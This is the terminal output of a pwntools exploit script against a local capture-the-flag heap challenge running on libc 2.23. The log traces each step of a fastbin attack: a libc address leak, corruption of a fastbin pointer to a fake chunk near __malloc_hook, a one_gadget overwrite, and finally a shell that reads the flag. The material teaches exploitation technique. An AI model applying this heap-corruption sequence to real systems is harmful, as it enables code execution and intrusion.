 
 ```
# python3 pwn-fastbins.py BIN=./babyheap_patched
[*] '/demos/fastbins-demo/babyheap_patched'
[*] Loaded 14 cached gadgets for './babyheap_patched'
[*] '/demos/fastbins-demo/libc-2.23.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/demos/fastbins-demo/babyheap_patched': pid 183
[*] Made Initial Chunks [(0,0x18),(1,0x88),(2,0x18)]
[*] Paused (press any to continue)
[*] Freed Chunk(1) Into Unsorted bin
[*] Paused (press any to continue)
[*] Overwrote Chunk(1) with 0x93 (Is_Mapped)
[*] Paused (press any to continue)
[*] Reallocated Chunk(1) with 0x93
[*] Paused (press any to continue)
[*] Libc Leak Found in Chunk(1): 0x7f37dc44e000
[*] Paused (press any to continue)
[*] Allocated Chunk(3) with 0x68 * D
[*] Paused (press any to continue)
[*] Freed Chunk(3), placing in 0x70 Fastbins
[*] Paused (press any to continue)
[*] Overwrite Chunk(3) with 0x71 size and FD to Fake_Chunk
[*] Paused (press any to continue)
[*] Reallocated Chunk(3) as 0x68 * Ds
[*] Fake Chunk: 0x7f37dc812aed now at tail of fastbins
[*] Paused (press any to continue)
[*] One Gadget: 0x7f37dc49326a
[*] Allocated Chunk(4) with 0x68 Chunk(4) is 35 bytes before malloc hook
[*] Paused (press any to continue)
[*] Overwrote Malloc Hook. Shell next
[*] Paused (press any to continue)
[*] Switching to interactive mode
$ cat flag.txt
flag{i_sure_wished_this_worked_remotely_too}```